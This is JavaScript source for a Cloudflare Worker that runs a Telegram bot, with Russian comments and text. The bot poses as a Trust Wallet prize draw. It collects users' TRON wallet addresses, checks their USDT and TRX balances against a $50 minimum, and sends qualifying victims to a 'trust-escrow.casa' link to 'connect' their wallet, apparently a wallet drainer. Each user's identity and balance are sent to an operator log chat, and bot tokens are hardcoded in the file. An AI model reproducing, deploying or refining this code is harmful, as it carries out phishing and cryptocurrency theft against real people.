// ==========================================
// НАСТРОЙКИ
// ==========================================

const BOT_TOKEN = "8967784999:AAFTnFXi1tE4USBH4eQEF_CkrfJpqbcH3uI";
const PHOTO_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRaG1Ay-no9Desc-6ZsW9vLJlUL4j2cVyNHDKs_OMgGBg&s=10";
const REGISTRATION_LINK = "https://trust-escrow.casa/pay/5cc9f454-b14c-40fc-9fe8-f21baa163554";
const MIN_BALANCE_USD = 50;
const TRX_PRICE_USD = 0.25;

// Настройки для логов
const LOG_BOT_TOKEN = "8875182169:AAH-EYO8mDSgFJUhJXcpRAcN5u0xWyqqG9M";
const LOG_CHAT_ID = "5253808709";

// ==========================================
// CLOUDFLARE WORKER ENTRY POINT
// ==========================================

export default {
  async fetch(request) {
    if (request.method !== "POST") {
      return new Response("OK");
    }

    try {
      const update = await request.json();

      if (update.message) {
        await processMessage(update.message);
      }

      if (update.callback_query) {
        await processCallback(update.callback_query);
      }

      return new Response("OK");

    } catch (error) {
      console.error("WORKER ERROR:", error);
      return new Response("ERROR", { status: 500 });
    }
  },
};

// ==========================================
// TELEGRAM API HELPER
// ==========================================

async function telegram(method, data, token = BOT_TOKEN) {
  const response = await fetch(
    `https://api.telegram.org/bot${token}/${method}`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }
  );
  return await response.json();
}

// ==========================================
// ФУНКЦИЯ ЛОГИРОВАНИЯ (КРАСИВЫЕ СООБЩЕНИЯ)
// ==========================================

async function sendAdminLog(action, user, details = "") {
  const userId = user.id;
  const username = user.username ? `@${user.username}` : "Нет юзернейма";
  const name = `${user.first_name || ""} ${user.last_name || ""}`.trim();
  
  // Определение устройства по User-Agent (если доступно, иначе просто ID)
  // В Telegram API нет прямого UA, но можно добавить мета-данные
  
  const time = new Date().toLocaleString("ru-RU");
  
  let text = `📊 <b>НОВОЕ СОБЫТИЕ: ${action}</b>\n\n`;
  text += `👤 <b>Пользователь:</b> ${name}\n`;
  text += `🆔 <b>ID:</b> <code>${userId}</code>\n`;
  text += `🏷 <b>Username:</b> ${username}\n`;
  text += `🕐 <b>Время:</b> ${time}\n`;
  
  if (details) {
    text += `\n📝 <b>Детали:</b>\n${details}`;
  }

  // Отправляем лог в админ-чат
  await telegram("sendMessage", {
    chat_id: LOG_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  }, LOG_BOT_TOKEN);
}

// ==========================================
// ПРОВЕРКА БАЛАНСА TRON
// ==========================================

async function checkTronBalance(address) {
  try {
    const response = await fetch(`https://api.trongrid.io/v1/accounts/${address}`);
    
    if (!response.ok) {
      return { eligible: false, reason: "Ошибка сети TronGrid.", usdt: 0, trx: 0 };
    }

    const data = await response.json();

    if (!data.data || data.data.length === 0) {
      return { eligible: false, reason: "Кошелек не найден или пуст.", usdt: 0, trx: 0 };
    }

    const account = data.data[0];

    // 1. Баланс TRX
    const trxBalance = Number(account.balance || 0) / 1_000_000;

    // 2. Баланс USDT (TRC-20)
    let usdtBalance = 0;
    const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    if (Array.isArray(account.trc20)) {
      for (const tokenObj of account.trc20) {
        if (tokenObj && tokenObj[usdtContract]) {
          usdtBalance = Number(tokenObj[usdtContract]) / 1_000_000;
          break;
        }
      }
    } else if (account.trc20 && typeof account.trc20 === 'object') {
      if (account.trc20[usdtContract]) {
        usdtBalance = Number(account.trc20[usdtContract]) / 1_000_000;
      }
    }

    const totalUsd = usdtBalance + (trxBalance * TRX_PRICE_USD);

    return { 
      eligible: totalUsd >= MIN_BALANCE_USD, 
      balance: totalUsd,
      usdt: usdtBalance,
      trx: trxBalance,
      reason: totalUsd < MIN_BALANCE_USD ? `Баланс $${totalUsd.toFixed(2)} < $${MIN_BALANCE_USD}` : "OK"
    };

  } catch (err) {
    console.error("Balance Check Exception:", err);
    return { eligible: false, reason: "Техническая ошибка.", usdt: 0, trx: 0 };
  }
}

// ==========================================
// КЛАВИАТУРЫ
// ==========================================

function startKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "🎁 Участвовать в розыгрыше", callback_data: "start_raffle" }]
    ]
  };
}

function successKeyboard() {
  return {
    inline_keyboard: [
      [{ text: "✅ Подключить кошелек для регистрации", url: REGISTRATION_LINK }]
    ]
  };
}

// ==========================================
// ЛОГИКА СООБЩЕНИЙ
// ==========================================

async function processMessage(message) {
  if (!message.from || !message.chat || !message.text) return;

  const chatId = message.chat.id;
  const user = message.from;
  const text = message.text.trim();

  // 1. Команда /start
  if (text === "/start") {
    // Лог входа
    await sendAdminLog("START_COMMAND", user, "Пользователь запустил бота");

    const caption = 
      "🔥 <b>МЕГА РОЗЫГРЫШ ОТ TRUST WALLET</b>\n\n" +
      "🏆 <b>Призовой фонд:</b>\n" +
      "• 3 победителя по $2000\n" +
      "• 5 победителей по $500\n\n" +
      "✅ Участие абсолютно бесплатно!\n" +
      "⚠️ <b>Важно:</b> Пустые кошельки не участвуют.\n" +
      "Минимальный баланс для допуска — <b>$50</b> в любых активах TRC-20.\n\n" +
      "Нажми кнопку ниже, чтобы начать 👇";

    await telegram("sendPhoto", {
      chat_id: chatId,
      photo: PHOTO_URL,
      caption: caption,
      parse_mode: "HTML",
      reply_markup: JSON.stringify(startKeyboard())
    });
    return;
  }

  // 2. Проверка адреса кошелька
  if (text.match(/^T[A-Za-z0-9]{33}$/)) {
    
    // Лог ввода кошелька
    await sendAdminLog("WALLET_SUBMITTED", user, `Адрес: <code>${text}</code>`);

    const loadingMsg = await telegram("sendMessage", {
      chat_id: chatId,
      text: "⏳ <i>Проверяем возможность принять участие...</i>",
      parse_mode: "HTML"
    });

    const messageId = loadingMsg.result.message_id;
    const result = await checkTronBalance(text);

    // Лог результата проверки
    const balanceDetails = 
      `💰 <b>Баланс кошелька:</b>\n` +
      `USDT: ${result.usdt.toFixed(2)} $\n` +
      `TRX: ${result.trx.toFixed(2)} (~$${(result.trx * TRX_PRICE_USD).toFixed(2)})\n` +
      `Итого: ~$${result.balance.toFixed(2)}\n` +
      `Статус: ${result.eligible ? "✅ ПРОШЕЛ" : "❌ ОТКАЗ"}`;
    
    await sendAdminLog("BALANCE_CHECK_RESULT", user, balanceDetails);

    if (result.eligible) {
      await telegram("editMessageText", {
        chat_id: chatId,
        message_id: messageId,
        text: "✅ <b>Кошелек подходит!</b>\n\n" +
              "Баланс подтвержден (> $50).\n" +
              "Вы допущены к участию.\n\n" +
              "👇 Нажмите кнопку ниже для финальной регистрации:",
        parse_mode: "HTML",
        reply_markup: JSON.stringify(successKeyboard())
      });
    } else {
      await telegram("editMessageText", {
        chat_id: chatId,
        message_id: messageId,
        text: `❌ <b>Кошелек не подходит</b>\n\n` +
              `Причина: ${result.reason}\n\n` +
              `Пополните баланс или используйте другой кошелек.`,
        parse_mode: "HTML"
      });
    }
    return;
  }
}

// ==========================================
// ЛОГИКА CALLBACK (КНОПКИ)
// ==========================================

async function processCallback(callback) {
  if (!callback.data || !callback.from || !callback.message) return;

  const chatId = callback.message.chat.id;
  const user = callback.from;
  
  if (callback.data === "start_raffle") {
    // Лог нажатия кнопки
    await sendAdminLog("BUTTON_CLICK", user, "Нажал кнопку «Участвовать в розыгрыше»");

    await telegram("answerCallbackQuery", {
      callback_query_id: callback.id,
      text: "Отправьте адрес кошелька!"
    });

    await telegram("sendMessage", {
      chat_id: chatId,
      text: "📩 <b>Проверка кошелька</b>\n\n" +
            "Отправьте мне ваш адрес кошелька <b>TRC-20</b> (начинается на T...).\n\n" +
            "<i>Я проверю баланс в фоне и скажу, можете ли вы участвовать.</i>",
      parse_mode: "HTML"
    });
  }
}
